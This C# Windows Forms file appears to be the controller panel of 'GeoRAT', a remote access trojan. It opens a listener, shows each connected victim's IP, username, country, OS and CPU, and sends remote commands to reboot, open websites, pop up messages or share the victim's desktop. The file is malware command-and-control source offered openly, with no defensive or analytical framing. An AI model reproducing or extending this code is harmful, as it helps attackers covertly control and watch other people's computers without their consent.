
using System;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Windows.Forms;
using GeoRAT.Server.CommandHandlers;
using GeoRAT.Server.Net;
using GeoRAT.Core.Commands;
using GeoRAT.Core.PacketStruct;
using GeoRAT.Core.Compressor;
using GeoRAT.Server.Net.DesktopSharing;
using Microsoft.VisualBasic;
using StreamLibrary;
using StreamLibrary.UnsafeCodecs;

namespace GeoRAT.Server
{
    public partial class Form1 : Form
    {
        private CommandSender Sender;
        public Form1()
        {
            InitializeComponent();
            
        }

        #region Start

        private void xylosButton1_Click(object sender, EventArgs e)
        {
            var ip = xylosTextBox1.Text;
            int port;
            bool convert = Int32.TryParse(xylosTextBox2.Text, out  port);
            if (!convert && string.IsNullOrEmpty(ip) || !convert || string.IsNullOrEmpty(ip))
            {
                MessageBox.Show("Enter correct IP and Port!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);

            }
            else
            {

                NetworkServer ns = new NetworkServer(ip, port);
                ns.OnConnected += OnConnectedHandler;
                ns.Start();
                MessageBox.Show(ip + ":" + port.ToString(), "Listener started on", MessageBoxButtons.OK,
                    MessageBoxIcon.Information);

            }
            
                
        }

        #endregion


        #region Connection
        //Handle new connection 
        private void OnConnectedHandler(Socket s)
        {

            DataHandler handle = new DataHandler(s); //We got socket, lets make DataHandler using it, which does all operations on specified socket (reading data)
            handle.OnDisconnected += OnDisconnectedHandler; //Associate datahandler events with handler functions 
            handle.OnReceived += OnDataReceived;

        }


        #endregion

        #region Data
        //Received data from client, lets decompress, deserialize it and then add info to listview 
        private void OnDataReceived(byte[] buffer, Socket received)
        {
            Serializer infoSerializer = new Serializer();
            var decompress = Compression.Decompress(buffer);
            var data = infoSerializer.Deserialize(decompress);

            //Invokes Action delegate and begins processing of information we got so far 
            Invoke(new Action(
                () =>
                {
                    var ip = received.RemoteEndPoint.ToString().Split(':');
                    //find flag for our Country 
                    int index = 0;
                    for (int i = 0; i < Flags.Images.Count - 1; i++)
                    {
                        string name = Flags.Images.Keys[i].ToLower();
                        if (name.Contains(data.Country.ToLower()))
                        {
                            index = Flags.Images.IndexOfKey(name);
                        }
                    }

                    //add data to listview including flag 
                    ListViewItem item = new ListViewItem();
                    item.Tag = received;
                    item.Text = ip[0];
                    item.SubItems.Add(data.UserName);
                    item.ImageIndex = index;
                    item.SubItems.Add(data.Country);
                    item.SubItems.Add(data.OS);
                    item.SubItems.Add(data.CPU);
                    lvConnections.Items.Add(item);
                    

                }));
        }



        #endregion

        #region Disconnection

       
        //if client disconnects, remove it from listview 

        private void OnDisconnectedHandler(Socket s)
        {
            Invoke(new Action(
                () =>
                {
                   foreach (ListViewItem i in lvConnections.Items)
                        if ((Socket)i.Tag == s)
                        {
                          i.Remove();
                        }
                }));

        }


        #endregion

        #region Send Commands 
        //send Disconnect
        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem i in lvConnections.SelectedItems)
            {
                Sender = new CommandSender((Socket)i.Tag, new Commands("Disconnect", "'"));

            }
        }

        //Send Open Website 
        private void openWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var site = Interaction.InputBox("Enter URL:", "Open Website", "http://");
            foreach (ListViewItem i in lvConnections.SelectedItems)
            {
                Sender = new CommandSender((Socket)i.Tag, new Commands("OpenURL", site));
            }
        }

        //Send Reboot 
        private void rebootToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem i in lvConnections.SelectedItems)
            {
                Sender = new CommandSender((Socket)i.Tag, new Commands("Restart", "'"));

            }
        }

        //Send Message
        private void sendMessageToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem i in lvConnections.SelectedItems)
            {
                var msg = Interaction.InputBox("Enter Message to send", "Messagebox", "Hello");
                Sender = new CommandSender((Socket)i.Tag, new Commands("Message", msg));
            }
        }

        private void desktopSharingToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem i in lvConnections.SelectedItems)
            {
                Sender = new CommandSender((Socket) i.Tag, new Commands("Desktop", ""));
              }
        }
        #endregion

       

    }
}
